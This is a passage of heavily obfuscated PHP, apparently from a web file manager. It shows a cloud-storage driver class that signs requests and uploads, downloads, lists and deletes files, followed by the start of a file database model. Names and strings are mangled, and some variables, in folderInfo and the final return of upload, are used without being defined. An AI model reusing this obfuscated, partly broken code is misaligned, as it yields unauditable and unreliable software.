$ioFileOutServer = 0; public function __construct($™ššììà) { parent::__construct(); $this->_init($™ššììà); } public function _init($´•áçœº) { $÷¬“¨ûæ =& $_SERVER[ÏéâËõ‘]; foreach ($´•áçœº as $÷ãÉ¹ŠÑ => $‡„ªÑ¿) { if (isset($this->{$÷ãÉ¹ŠÑ})) { $this->{$÷ãÉ¹ŠÑ} = $‡„ªÑ¿; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($÷¬“¨ûæ[1459] . LNG($÷¬“¨ûæ[1390])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($åÑ•×Â±, $õÒÁ®šë = "\107\105\x54") { $‹ùñÌ® =& $_SERVER[ÏéâËõ‘]; $ç²³®È• = gmdate($‹ùñÌ®[1423]); $›Ú¸«ï = base64_encode(hash_hmac($‹ùñÌ®[1460], "{$õÒÁ®šë}\46{$åÑ•×Â±}\46{$ç²³®È•}", md5("{$this->userpass}"), !0)); $ó†˜”” = array("\x41\165\x74\150\157\162\151\x7a\141\x74\151\157\156\x3a\x55\x50\131\x55\116\x20{$this->username}\72{$›Ú¸«ï}", "\104\141\164\145\x3a{$ç²³®È•}"); return $ó†˜””; } public function ussRequest($¡²ş²ï, $¬åáÓ­÷ = "\x47\x45\124", $‚êüº©ê = false, $à†ÒÊÙğ = false, $øüÑ“‰ = false) { $ÕììóÃ =& $_SERVER[ÏéâËõ‘]; $¡²ş²ï = trim($¡²ş²ï, $ÕììóÃ[8]); $¥½ù¡Â = "\57{$this->bucket}\57{$¡²ş²ï}"; $íÅ”¢£ü = $this->ussHeaders($¥½ù¡Â, $¬åáÓ­÷); if ($à†ÒÊÙğ) { $íÅ”¢£ü = array_merge($íÅ”¢£ü, $à†ÒÊÙğ); } $ïÇÜÓÔ¯ = url_request($this->endpoint . $¥½ù¡Â, $¬åáÓ­÷, $‚êüº©ê, $íÅ”¢£ü, $øüÑ“‰); if (!$ïÇÜÓÔ¯) { return array($ÕììóÃ[1196] => !1, $ÕììóÃ[1198] => $ÕììóÃ[1461]); } if (strtolower($¬åáÓ­÷) == $ÕììóÃ[196] || in_array($ïÇÜÓÔ¯[$ÕììóÃ[1196]], array($ÕììóÃ[1315], $ÕììóÃ[1462]))) { $‚êüº©ê = $ïÇÜÓÔ¯[$ÕììóÃ[1463]]; } else { $‚êüº©ê = json_decode($ïÇÜÓÔ¯[$ÕììóÃ[1198]], !0); if (!$‚êüº©ê) { $‚êüº©ê = $ïÇÜÓÔ¯[$ÕììóÃ[1198]]; } else { if (!$ïÇÜÓÔ¯[$ÕììóÃ[752]] && isset($‚êüº©ê[$ÕììóÃ[1464]])) { $‚êüº©ê = $‚êüº©ê[$ÕììóÃ[1464]]; } } } return array($ÕììóÃ[1196] => $ïÇÜÓÔ¯[$ÕììóÃ[752]], $ÕììóÃ[1198] => $‚êüº©ê); } public function mkfile($‘¾éôÇŞ, $ï±İœ«¨ = '', $Íâó™‹£ = REPEAT_RENAME) { if ($this->setContent($‘¾éôÇŞ, $ï±İœ«¨)) { return $this->getPathOuter($‘¾éôÇŞ); } return !1; } public function mkdir($ÛÉ¬ÛÓ÷, $‘ûÂñ”ë = REPEAT_SKIP) { $æÚã°à— =& $_SERVER[ÏéâËõ‘]; $«ÏÄ‚ = trim($ÛÉ¬ÛÓ÷, $æÚã°à—[8]); if ($this->_isFolder($«ÏÄ‚)) { return $this->getPathOuter($«ÏÄ‚); } $¨Î¦õ±ˆ = array($æÚã°à—[1465]); $ßÆ‘Ğ×º = $this->ussRequest($«ÏÄ‚, $æÚã°à—[226], !1, $¨Î¦õ±ˆ); return $ßÆ‘Ğ×º[$æÚã°à—[1196]] ? $this->getPathOuter($«ÏÄ‚) : !1; } public function copyFile($Ùéãµê–, $öøô¾Õ) { $›²¯’µÀ =& $_SERVER[ÏéâËõ‘]; $Ğ¨ÓÎ = array($›²¯’µÀ[1466] . "\x2f{$this->bucket}\57{$Ùéãµê–}", $›²¯’µÀ[1467]); $ÌÑÑ÷Û = $this->ussRequest($öøô¾Õ, $›²¯’µÀ[228], !1, $Ğ¨ÓÎ); return $ÌÑÑ÷Û[$›²¯’µÀ[1196]] ? !0 : $this->getPathOuter($öøô¾Õ); } public function moveFile($©ÎŸ™ğ­, $ëúóí¯Í) { $ÉßÀÄéá =& $_SERVER[ÏéâËõ‘]; $âÒóö”ô = array($ÉßÀÄéá[1468] . "\57{$this->bucket}\57{$©ÎŸ™ğ­}", $ÉßÀÄéá[1467]); $™Õ”ø— = $this->ussRequest($ëúóí¯Í, $ÉßÀÄéá[228], !1, $âÒóö”ô); return $™Õ”ø—[$ÉßÀÄéá[1196]] ? !0 : $this->getPathOuter($ëúóí¯Í); } public function delFile($«Ë×†éÕ) { $Ï¡°—¸Ô =& $_SERVER[ÏéâËõ‘]; $¯öƒè²ú = $this->ussRequest($«Ë×†éÕ, $Ï¡°—¸Ô[1469]); return $¯öƒè²ú[$Ï¡°—¸Ô[1196]] ? !0 : !1; } public function delFolder($‹ğÍ¼Î) { $åø‰¯õ =& $_SERVER[ÏéâËõ‘]; if (!$this->exist($‹ğÍ¼Î)) { return !0; } $this->listItemCache = !1; $ÔÉÙŠÀ’ = $Ç·ÉÒï = array(); $this->fileList($‹ğÍ¼Î, $ÔÉÙŠÀ’, $Ç·ÉÒï, !0); $this->listItemCache = !0; foreach ($Ç·ÉÒï as $·†ıø€ë) { $®Ë¾Æ¢ı = $this->ussRequest($·†ıø€ë[$åø‰¯õ[32]], $åø‰¯õ[1469]); if (!$®Ë¾Æ¢ı[$åø‰¯õ[1196]]) { return !1; } } foreach ($ÔÉÙŠÀ’ as $ı’ªëı) { $®Ë¾Æ¢ı = $this->ussRequest($ı’ªëı, $åø‰¯õ[1469]); if (!$®Ë¾Æ¢ı[$åø‰¯õ[1196]]) { return !1; } } $®Ë¾Æ¢ı = $this->ussRequest($‹ğÍ¼Î, $åø‰¯õ[1469]); return $®Ë¾Æ¢ı[$åø‰¯õ[1196]]; } public function rename($Ùó†öñŠ, $‡å€ä£”) { if ($this->isFile($Ùó†öñŠ)) { $‡å€ä£” = get_path_father($Ùó†öñŠ) . $‡å€ä£”; return $this->moveFile($Ùó†öñŠ, $‡å€ä£”); } return $this->renameObject($Ùó†öñŠ, $‡å€ä£”); } public function fileInfo($¡…ÂÉà—, $ÚÍûş» = false, $ÊíÀ©†× = array()) { $í¿Œô…á =& $_SERVER[ÏéâËõ‘]; $š‡´³ê• = array($í¿Œô…á[32] => $this->pathThis($¡…ÂÉà—), $í¿Œô…á[84] => $this->getPathOuter($í¿Œô…á[8] . $¡…ÂÉà—), $í¿Œô…á[33] => $í¿Œô…á[199], $í¿Œô…á[76] => isset($ÊíÀ©†×[$í¿Œô…á[76]]) ? $ÊíÀ©†×[$í¿Œô…á[76]] : 0, $í¿Œô…á[174] => $this->ext($¡…ÂÉà—)); if ($ÚÍûş») { return $š‡´³ê•; } $š‡´³ê•[$í¿Œô…á[200]] = $š‡´³ê•[$í¿Œô…á[85]] = 0; $š‡´³ê•[$í¿Œô…á[201]] = $š‡´³ê•[$í¿Œô…á[202]] = !0; if (empty($ÊíÀ©†×)) { $ÊíÀ©†× = $this->objectMeta($¡…ÂÉà—); if (!$ÊíÀ©†×) { return $š‡´³ê•; } } $š‡´³ê•[$í¿Œô…á[200]] = intval($ÊíÀ©†×[$í¿Œô…á[1470]]); $š‡´³ê•[$í¿Œô…á[85]] = intval($ÊíÀ©†×[$í¿Œô…á[1471]]); $š‡´³ê•[$í¿Œô…á[76]] = $ÊíÀ©†×[$í¿Œô…á[76]]; return $š‡´³ê•; } public function folderInfo($ñÆµ¤Œ, $ ‰×ç­˜ = false) { $Æ¼‡‚èµ =& $_SERVER[ÏéâËõ‘]; $í¾ä½© = array($Æ¼‡‚èµ[32] => $this->pathThis($ñÆµ¤Œ), $Æ¼‡‚èµ[84] => $this->getPathOuter($Æ¼‡‚èµ[8] . $ñÆµ¤Œ), $Æ¼‡‚èµ[33] => $Æ¼‡‚èµ[75]); if ($ ‰×ç­˜) { return $í¾ä½©; } $í¾ä½©[$Æ¼‡‚èµ[200]] = $í¾ä½©[$Æ¼‡‚èµ[85]] = 0; $í¾ä½©[$Æ¼‡‚èµ[201]] = $í¾ä½©[$Æ¼‡‚èµ[202]] = !0; if (empty($ºËä³¼ö)) { $ºËä³¼ö = $this->objectMeta($ñÆµ¤Œ); if (!$ºËä³¼ö) { return $í¾ä½©; } } $í¾ä½©[$Æ¼‡‚èµ[200]] = intval($ºËä³¼ö[$Æ¼‡‚èµ[1470]]); $í¾ä½©[$Æ¼‡‚èµ[85]] = intval($ºËä³¼ö[$Æ¼‡‚èµ[1471]]); return $í¾ä½©; } private function listObjs($üĞ¡ûÛ†, $û°™Ä‰È = 0, $ËÚ÷óÙ— = 1000) { $©µÈµ÷ =& $_SERVER[ÏéâËõ‘]; $‡¯ÜÖçÑ = array($©µÈµ÷[1472], $©µÈµ÷[1473] . $ËÚ÷óÙ—); if ($û°™Ä‰È) { $‡¯ÜÖçÑ[] = $©µÈµ÷[1474] . $û°™Ä‰È; } $™©²åã† = $this->ussRequest($üĞ¡ûÛ†, $©µÈµ÷[230], !1, $‡¯ÜÖçÑ); return !$™©²åã†[$©µÈµ÷[1196]] ? !1 : $™©²åã†[$©µÈµ÷[1198]]; } private function fileList($ÒÏÛàòÉ, &$…ºÏ’ÒŠ, &$Õƒ‰ƒÉı, $ğğÔùó± = false) { $›‡ÜâÚä =& $_SERVER[ÏéâËõ‘]; $ËíÍÈ—Ø = $›‡ÜâÚä[12]; $–Ààø¢ë = 1000; $†ôˆããÀ = rtrim($ÒÏÛàòÉ, $›‡ÜâÚä[8]) . $›‡ÜâÚä[8]; while (!0) { check_abort(); $ñÚèÔ†ş = $this->listObjs($ÒÏÛàòÉ, $ËíÍÈ—Ø, $–Ààø¢ë); if (!$ñÚèÔ†ş) { return !1; } $ËíÍÈ—Ø = isset($ñÚèÔ†ş[$›‡ÜâÚä[1475]]) ? $ñÚèÔ†ş[$›‡ÜâÚä[1475]] : $›‡ÜâÚä[12]; $ÙûÖú† = isset($ñÚèÔ†ş[$›‡ÜâÚä[1476]]) ? $ñÚèÔ†ş[$›‡ÜâÚä[1476]] : array(); foreach ($ÙûÖú† as $»Ãš‡½) { $ úÙ‚ë¶ = $»Ãš‡½[$›‡ÜâÚä[33]] == $›‡ÜâÚä[75] ? !0 : !1; $Œçƒ³Ê = ltrim($†ôˆããÀ . $»Ãš‡½[$›‡ÜâÚä[32]], $›‡ÜâÚä[8]) . ($ úÙ‚ë¶ ? $›‡ÜâÚä[8] : $›‡ÜâÚä[12]); $æÓßî¯ = array($›‡ÜâÚä[32] => $Œçƒ³Ê, $›‡ÜâÚä[33] => $ úÙ‚ë¶ ? $›‡ÜâÚä[75] : $›‡ÜâÚä[199], $›‡ÜâÚä[76] => $»Ãš‡½[$›‡ÜâÚä[337]], $›‡ÜâÚä[1471] => $»Ãš‡½[$›‡ÜâÚä[1477]]); $this->cacheMethodInfoSet($Œçƒ³Ê, $ úÙ‚ë¶, $æÓßî¯); if ($ úÙ‚ë¶) { $…ºÏ’ÒŠ[] = $Œçƒ³Ê; if ($ğğÔùó±) { $this->fileList($Œçƒ³Ê, $…ºÏ’ÒŠ, $Õƒ‰ƒÉı, $ğğÔùó±); } continue; } $Õƒ‰ƒÉı[] = $æÓßî¯; } if (count($ÙûÖú†) < $–Ààø¢ë) { break; } } $this->cacheMethodInfoSet($ÒÏÛàòÉ, !0); } public function listPath($²µñ•Ê´, $£Å·ŒËë = false) { $§›ô„í =& $_SERVER[ÏéâËõ‘]; $ÖƒªÖ¯ = $ˆİ –Ïì = array(); $this->fileList($²µñ•Ê´, $ÖƒªÖ¯, $ˆİ –Ïì); foreach ($ÖƒªÖ¯ as $­¥—£²İ => $š™§ó±×) { $ÖƒªÖ¯[$­¥—£²İ] = $this->folderInfo($š™§ó±×, $£Å·ŒËë); } foreach ($ˆİ –Ïì as $­¥—£²İ => $š™§ó±×) { $ˆİ –Ïì[$­¥—£²İ] = $this->fileInfo($š™§ó±×[$§›ô„í[32]], $£Å·ŒËë, $š™§ó±×); } return array($§›ô„í[82] => $ÖƒªÖ¯, $§›ô„í[83] => $ˆİ –Ïì); } public function has($‰¼Ö¹ƒú, $Ø±®äÉÇ = false, $ù‘ğõİ¬ = true) { $àñÊº =& $_SERVER[ÏéâËõ‘]; $Ù›Œ­µÂ = $àñÊº[12]; $›ë±Å = 500; $’æâÕºá = 0; $çö×î‰ë = 0; $Âáûàòì = rtrim($‰¼Ö¹ƒú, $àñÊº[8]) . $àñÊº[8]; while (!0) { check_abort(); $¸Äœ¼»¤ = $this->listObjs($‰¼Ö¹ƒú, $Ù›Œ­µÂ, $›ë±Å); if (!$¸Äœ¼»¤) { return !1; } $Ù›Œ­µÂ = isset($¸Äœ¼»¤[$àñÊº[1475]]) ? $¸Äœ¼»¤[$àñÊº[1475]] : $àñÊº[12]; $®˜¡ßËí = isset($¸Äœ¼»¤[$àñÊº[1476]]) ? $¸Äœ¼»¤[$àñÊº[1476]] : array(); if (empty($®˜¡ßËí)) { break; } $îˆ¼²ì¨ = array_filter($®˜¡ßËí, function ($ç¯½†ò) { $¢°ØïÛ =& $_SERVER[ÏéâËõ‘]; return $ç¯½†ò[$¢°ØïÛ[33]] == $¢°ØïÛ[75]; }); $œşåŞøİ = count($®˜¡ßËí); $îˆ¼²ì¨ = count($îˆ¼²ì¨); $–‰…îÆ = $œşåŞøİ - $îˆ¼²ì¨; if ($Ø±®äÉÇ) { $çö×î‰ë += $îˆ¼²ì¨; $’æâÕºá += $–‰…îÆ; if ($œşåŞøİ < $›ë±Å) { break; } continue; } if ($ù‘ğõİ¬) { if ($–‰…îÆ) { return !0; } } else { if ($îˆ¼²ì¨) { return !0; } } if ($œşåŞøİ < $›ë±Å) { break; } } if ($Ø±®äÉÇ) { return array($àñÊº[207] => $’æâÕºá, $àñÊº[208] => $çö×î‰ë); } return !1; } public function listAll($™¯‚Šò) { $ª€áñ¦ =& $_SERVER[ÏéâËõ‘]; $¡€ƒ§’® = $ê¥ƒÈÄ = array(); $this->fileList($™¯‚Šò, $¡€ƒ§’®, $ê¥ƒÈÄ, !0); $ØÆ†è¹ = array(); foreach ($ê¥ƒÈÄ as $Ò—¡ää˜) { $ØÆ†è¹[$Ò—¡ää˜[$ª€áñ¦[32]]] = $Ò—¡ää˜[$ª€áñ¦[76]]; } foreach ($¡€ƒ§’® as $Ò—¡ää˜) { if (is_string($Ò—¡ää˜)) { $ØÆ†è¹[$Ò—¡ää˜] = 0; } } return $this->listAllFiles($™¯‚Šò, array_keys($ØÆ†è¹), $ØÆ†è¹); } public function canRead($ˆ“êºÅÙ) { return $this->exist($ˆ“êºÅÙ) ? !0 : !1; } public function canWrite($ë÷×Ç”Ø) { return $this->exist($ë÷×Ç”Ø) ? !0 : !1; } public function getContent($Áèò•ÚØ) { return $this->fileSubstr($Áèò•ÚØ, 0, -1); } public function setContent($Äõå’©¼, $ÎÚÙç¢ò = '') { $ÑèÂ±»â =& $_SERVER[ÏéâËõ‘]; if (!$ÎÚÙç¢ò) { $²ˆ¶ÂèÆ = $this->ussRequest($Äõå’©¼, $ÑèÂ±»â[226]); return $²ˆ¶ÂèÆ[$ÑèÂ±»â[1196]]; } $ò¤¥‹¢À = $this->tempFile($this->pathThis($Äõå’©¼)); file_put_contents($ò¤¥‹¢À, $ÎÚÙç¢ò); if ($this->upload($Äõå’©¼, $ò¤¥‹¢À)) { $this->tempFileRemve($ò¤¥‹¢À); return !0; } return !1; } public function fileSubstr($Ë˜‡½ê¿, $ıâßåÈ, $™Ü´öÅ) { $äí‘‘ßÏ =& $_SERVER[ÏéâËõ‘]; if (!($™³»›€ = $this->link($Ë˜‡½ê¿))) { return !1; } $²¾ü«­Ğ = !1; if ($™Ü´öÅ > 0) { $©Ü¶¬èÆ = $ıâßåÈ + $™Ü´öÅ - 1; $²¾ü«­Ğ = array($äí‘‘ßÏ[1438] . $ıâßåÈ . $äí‘‘ßÏ[386] . $©Ü¶¬èÆ); } $£õ­¸û• = url_request($™³»›€, $äí‘‘ßÏ[230], !1, $²¾ü«­Ğ); return $£õ­¸û•[$äí‘‘ßÏ[752]] ? $£õ­¸û•[$äí‘‘ßÏ[1198]] : !1; } public function upload($³ğóÖ¸Œ, $©†àÈºŠ, $˜œ€¦í = false, $¢»²³÷Ú = REPEAT_REPLACE) { $œÍÎÅ‚ª =& $_SERVER[ÏéâËõ‘]; $‚ıµÕÄò = IO::size($©†àÈºŠ); if ($‚ıµÕÄò <= 1024 * 1024 * 200) { $›Éìæ‹‰ = array($œÍÎÅ‚ª[1478] . $©†àÈºŠ); $Ôôáû®í = $this->ussRequest($³ğóÖ¸Œ, $œÍÎÅ‚ª[228], $›Éìæ‹‰); return $Ôôáû®í[$œÍÎÅ‚ª[1196]] ? $this->getPathOuter($³ğóÖ¸Œ) : !1; } $á©™Ùş‚ = 1024 * 1024 * 10; $Óø‚ªöœ = array($œÍÎÅ‚ª[1479], $œÍÎÅ‚ª[1480] . $‚ıµÕÄò, $œÍÎÅ‚ª[1481], $œÍÎÅ‚ª[1482] . $á©™Ùş‚); $Ôôáû®í = $this->ussRequest($³ğóÖ¸Œ, $œÍÎÅ‚ª[228], !1, $Óø‚ªöœ); if (!$Ôôáû®í[$œÍÎÅ‚ª[1196]]) { return !1; } $½Éğ¥³ü = $Ôôáû®í[$œÍÎÅ‚ª[1198]]; $®Üò™Ëö = 0; $ûñô‹æ = $½Éğ¥³ü[$œÍÎÅ‚ª[1483]]; $‘úŒô©û = fopen($©†àÈºŠ, $œÍÎÅ‚ª[1387]); if (!$‘úŒô©û) { return !1; } do { $¡øõ¡ø‡ = $½Éğ¥³ü[$œÍÎÅ‚ª[1484]]; fseek_64($‘úŒô©û, $®Üò™Ëö); $÷­ÍåÁµ = fread($‘úŒô©û, $¡øõ¡ø‡); $ÌÉ³‘™Ì = 0; do { $ÌÉ³‘™Ì++; $½Éğ¥³ü = $this->uploadPart($³ğóÖ¸Œ, $½Éğ¥³ü, $÷­ÍåÁµ); } while (!$½Éğ¥³ü && $ÌÉ³‘™Ì < 3); if (!$½Éğ¥³ü) { return !1; } $ûñô‹æ = $½Éğ¥³ü[$œÍÎÅ‚ª[1483]]; $®Üò™Ëö += $¡øõ¡ø‡; } while ($ûñô‹æ != -1); fclose($‘úŒô©û); $Óø‚ªöœ = array($œÍÎÅ‚ª[1485], $œÍÎÅ‚ª[1486] . $½Éğ¥³ü[$œÍÎÅ‚ª[1487]], $œÍÎÅ‚ª[1481]); $Ôôáû®í = $this->ussRequest($³ğóÖ¸Œ, $œÍÎÅ‚ª[228], !1, $Óø‚ªöœ); return $Ôôáû®í[$œÍÎÅ‚ª[1196]] ? $this->getPathOuter($¨İıÈ§º) : !1; } private function uploadPart($ïïŒ˜â, $óÉş¦Ë, &$”Â±œ’Â) { $¯¢ô´Ò =& $_SERVER[ÏéâËõ‘]; $œ¶ØÉí¼ = array($¯¢ô´Ò[1488], $¯¢ô´Ò[1486] . $óÉş¦Ë[$¯¢ô´Ò[1487]], $¯¢ô´Ò[1489] . $óÉş¦Ë[$¯¢ô´Ò[1483]], $¯¢ô´Ò[142] . $óÉş¦Ë[$¯¢ô´Ò[1484]]); $Ã¸óë¶ = $this->ussRequest($ïïŒ˜â, $¯¢ô´Ò[228], $”Â±œ’Â, $œ¶ØÉí¼); return !$Ã¸óë¶[$¯¢ô´Ò[1196]] ? $Ã¸óë¶[$¯¢ô´Ò[1196]] : $Ã¸óë¶[$¯¢ô´Ò[1198]]; } public function uploadFormData($­ÎÖÅ’³, $úª¬™Ç® = 3600) { return $this->uploadPolicy($­ÎÖÅ’³, $úª¬™Ç®); } public function multiUploadFormData($ÛŒº, $»çµß… = 3600) { $öü°ú =& $_SERVER[ÏéâËõ‘]; $Ã¹ŞÇ¤Á = (int) $GLOBALS[$öü°ú[7]][$öü°ú[76]]; return $this->uploadPolicy($ÛŒº, $»çµß…, $Ã¹ŞÇ¤Á); } private function uploadPolicy($š¨Êï‰¼, $Éã¡úÓÇ = 3600, $À¢Ç“ˆ§ = 0) { $åõÌ£¹Û =& $_SERVER[ÏéâËõ‘]; $×¨™ôĞò = $åõÌ£¹Û[8] . $this->bucket; $Ë¸ö•şğ = gmdate($åõÌ£¹Û[1423]); $Úà»ŞºÉ = array($åõÌ£¹Û[1490] => $this->bucket, $åõÌ£¹Û[1491] => $š¨Êï‰¼, $åõÌ£¹Û[1492] => time() + $Éã¡úÓÇ, $åõÌ£¹Û[1493] => $Ë¸ö•şğ); if ($À¢Ç“ˆ§) { $Úà»ŞºÉ[$åõÌ£¹Û[1403]] = $À¢Ç“ˆ§; } $ïÙ×èæÖ = base64_encode(json_encode($Úà»ŞºÉ)); $­…£€« = base64_encode(hash_hmac($åõÌ£¹Û[1460], "\120\117\x53\x54\x26{$×¨™ôĞò}\x26{$Ë¸ö•şğ}\46{$ïÙ×èæÖ}", md5("{$this->userpass}"), !0)); $Ù‘‚ú×¦ = array($åõÌ£¹Û[1327] => $ïÙ×èæÖ, $åõÌ£¹Û[1494] => "\x55\120\131\125\116\x20{$this->username}\x3a{$­…£€«}", $åõÌ£¹Û[181] => $this->endpoint . $×¨™ôĞò); return $Ù‘‚ú×¦; } public function download($Á‚®÷ÁÃ, $‚ñºËÑ·) { $¶ÔåçÏç = IO::getPathInner(IO::mkfile($‚ñºËÑ·)); if (!($¿üÀâß± = $this->link($Á‚®÷ÁÃ))) { return !1; } $¸é…Äğ = 0; $Ë£½Ù˜û = 1024 * 200; $™Óï¢‡ = fopen($¶ÔåçÏç, $_SERVER[ÏéâËõ‘][1444]); while (!0) { $üÔß“˜… = $this->fileSubstr($Á‚®÷ÁÃ, $¸é…Äğ, $Ë£½Ù˜û); if ($üÔß“˜… === !1) { return !1; } fwrite($™Óï¢‡, $üÔß“˜…); $¸é…Äğ += $Ë£½Ù˜û; if (strlen($üÔß“˜…) < $Ë£½Ù˜û) { break; } } fclose($™Óï¢‡); return $‚ñºËÑ·; } public function link($Ñ¯ñíËÈ, $ï—€öÂ… = array()) { $ˆƒ«Ö‰† =& $_SERVER[ÏéâËõ‘]; $Ñ¯ñíËÈ = trim($Ñ¯ñíËÈ, $ˆƒ«Ö‰†[8]); if (!empty($this->token)) { $ªí–öÂÒ = strtotime(date($ˆƒ«Ö‰†[1495])); $Öş½ºôã = substr(md5($this->token . $ˆƒ«Ö‰†[284] . $ªí–öÂÒ . $ˆƒ«Ö‰†[1496] . $Ñ¯ñíËÈ), 12, 8) . $ªí–öÂÒ; $ï—€öÂ…[] = $ˆƒ«Ö‰†[1497] . $Öş½ºôã; } $÷—®öëÓ = !empty($ï—€öÂ…) ? $ˆƒ«Ö‰†[73] . implode($ˆƒ«Ö‰†[284], $ï—€öÂ…) : $ˆƒ«Ö‰†[12]; return $this->getHost() . $ˆƒ«Ö‰†[8] . $Ñ¯ñíËÈ . $÷—®öëÓ; } public function fileOut($¢ÄÖ«·…, $öê©õ’± = false, $ùïû¨×Õ = false, $‘×„É¶É = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¢ÄÖ«·…, $öê©õ’±, $ùïû¨×Õ, $‘×„É¶É); } if (!$ùïû¨×Õ) { $ùïû¨×Õ = $this->pathThis($¢ÄÖ«·…); } $Ôåè›èÂ = $öê©õ’± ? array($_SERVER[ÏéâËõ‘][1498] . rawurlencode($ùïû¨×Õ)) : array(); $Ì‡¬ª = $this->link($¢ÄÖ«·…, $Ôåè›èÂ); $this->fileOutLink($Ì‡¬ª); } public function fileOutServer($µÉâ× , $¨²È„º = false, $¾à¯°…® = false, $˜”¯‰¡ = '') { parent::fileOut($µÉâ× , $¨²È„º, $¾à¯°…®, $˜”¯‰¡); } public function fileOutImage($¾ÒĞÔ‡, $Ş¥æÜ¤© = 250) { $ìøÏœÕ  = $this->link($¾ÒĞÔ‡ . $_SERVER[ÏéâËõ‘][1499] . $Ş¥æÜ¤©); $this->fileOutLink($ìøÏœÕ ); } public function fileOutImageServer($àì·Îôš, $­Ò™¬²È = 250) { parent::fileOutImage($àì·Îôš, $­Ò™¬²È); } public function hashMd5($ì—º¬Ú) { $›ËëÄĞŠ =& $_SERVER[ÏéâËõ‘]; $¹¦èÉÓ³ = $this->_objectMeta($ì—º¬Ú); return isset($¹¦èÉÓ³[$›ËëÄĞŠ[212]]) ? $¹¦èÉÓ³[$›ËëÄĞŠ[212]] : !1; } public function size($òà¯Æ•) { $Âôê¡ƒŠ = $this->objectMeta($òà¯Æ•); return $Âôê¡ƒŠ ? $Âôê¡ƒŠ[$_SERVER[ÏéâËõ‘][76]] : 0; } public function info($äˆë¿) { if ($this->isFolder($äˆë¿)) { return $this->folderInfo($äˆë¿); } else { if ($this->isFile($äˆë¿)) { return $this->fileInfo($äˆë¿); } } return !1; } public function exist($í¥õì„õ) { return $this->isFile($í¥õì„õ) || $this->isFolder($í¥õì„õ); } public function isFile($Ô–¤ÂäÛ) { return !$this->isFolder($Ô–¤ÂäÛ) && $this->objectMeta($Ô–¤ÂäÛ); } public function isFolder($øÎÃ’‹Í) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][165], $øÎÃ’‹Í); } protected function objectMeta($ä·å‘æò) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][167], $ä·å‘æò); } protected function _objectMeta($„ªâÓè‹) { $ÛÌÏ®¯Œ =& $_SERVER[ÏéâËõ‘]; if ($„ªâÓè‹ == $ÛÌÏ®¯Œ[12] || $„ªâÓè‹ == $ÛÌÏ®¯Œ[8]) { return array(); } $ÄÙ¦³ÉŞ = $this->ussRequest($„ªâÓè‹, $ÛÌÏ®¯Œ[1500]); if (!$ÄÙ¦³ÉŞ[$ÛÌÏ®¯Œ[1196]]) { return null; } $§¶§í© = isset($ÄÙ¦³ÉŞ[$ÛÌÏ®¯Œ[1198]]) ? $ÄÙ¦³ÉŞ[$ÛÌÏ®¯Œ[1198]] : array(); if (!isset($§¶§í©[$ÛÌÏ®¯Œ[1501]])) { return null; } $ôø˜¤†Ú = array($ÛÌÏ®¯Œ[33] => isset($§¶§í©[$ÛÌÏ®¯Œ[1501]]) ? $§¶§í©[$ÛÌÏ®¯Œ[1501]] : null, $ÛÌÏ®¯Œ[76] => isset($§¶§í©[$ÛÌÏ®¯Œ[1502]]) ? $§¶§í©[$ÛÌÏ®¯Œ[1502]] : null, $ÛÌÏ®¯Œ[212] => isset($§¶§í©[$ÛÌÏ®¯Œ[1503]]) ? $§¶§í©[$ÛÌÏ®¯Œ[1503]] : null, $ÛÌÏ®¯Œ[1470] => isset($§¶§í©[$ÛÌÏ®¯Œ[1504]]) ? $§¶§í©[$ÛÌÏ®¯Œ[1504]] : null); $ôø˜¤†Ú[$ÛÌÏ®¯Œ[1471]] = isset($§¶§í©[$ÛÌÏ®¯Œ[1505]]) ? strtotime($§¶§í©[$ÛÌÏ®¯Œ[1505]]) : $ôø˜¤†Ú[$ÛÌÏ®¯Œ[1470]]; return $ôø˜¤†Ú; } protected function _isFolder($®ÈºëÅì) { $•ÌŸ÷ã =& $_SERVER[ÏéâËõ‘]; if ($®ÈºëÅì == $•ÌŸ÷ã[12] || $®ÈºëÅì == $•ÌŸ÷ã[8]) { return !0; } $û´£Æ³ƒ = $this->_objectMeta($®ÈºëÅì); return isset($û´£Æ³ƒ[$•ÌŸ÷ã[33]]) && $û´£Æ³ƒ[$•ÌŸ÷ã[33]] == $•ÌŸ÷ã[75] ? !0 : !1; } } goto eòÉ·¦«À; C”²ñë•«: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\154\145\137\x63\157\x6e\x74\145\156\164\x73"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\x69\x6d\x65", "\164\151\x6d\145", "\151\x6e\x73\145\162\x74", "\x66\x75\156\x63\x74\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\x65"; protected $tableMeta = array("\164\x61\142\154\x65\116\x61\155\x65" => "\151\x6f\137\x66\x69\x6c\x65\137\155\x65\x74\141", "\155\145\x74\141\106\151\145\x6c\x64" => "\x66\x69\154\145\x49\x44"); public function fileInfo($ã•‚¯Ç”) { $Ñ·Î®¤ƒ =& $_SERVER[ÏéâËõ‘]; static $­Ë×™ı‘ = array(); if (!isset($­Ë×™ı‘[$ã•‚¯Ç”])) { $Ùƒ¹ß—Í = $Ñ·Î®¤ƒ[1883]; $şÂ€¥Õİ = Model($Ñ·Î®¤ƒ[471])->field($Ùƒ¹ß—Í)->where(array($Ñ·Î®¤ƒ[469] => $ã•‚¯Ç”))->find(); $­Ë×™ı‘[$ã•‚¯Ç”] = $şÂ€¥Õİ; } return $­Ë×™ı‘[$ã•‚¯Ç”]; } public function addFileByContent($øâÊŠ¦é = '', $îİ„èÑæ = '') { $ñ£ºÒ˜Á =& $_SERVER[ÏéâËõ‘]; $ß˜òß€ì = TEMP_PATH . $ñ£ºÒ˜Á[1884]; if (!is_dir($ß˜òß€ì)) { mk_dir($ß˜òß€ì); } $ÑÒŸ¾ıÒ = $ß˜òß€ì . $ñ£ºÒ˜Á[1885] . rand_string(16); file_put_contents($ÑÒŸ¾ıÒ, $øâÊŠ¦é); $Ñ‚µïºª = $this->addFile($ÑÒŸ¾ıÒ, $îİ„èÑæ, !0); if (file_exists($ÑÒŸ¾ıÒ)) { @unlink($ÑÒŸ¾ıÒ); } return $Ñ‚µïºª; } public function createFileName($Öø˜Íù¾, $÷¸œÊ = false, $©ÄŸˆ´ = false) { $‹Ğ­àıÛ =& $_SERVER[ÏéâËõ‘]; $ü¿õÚÔ = 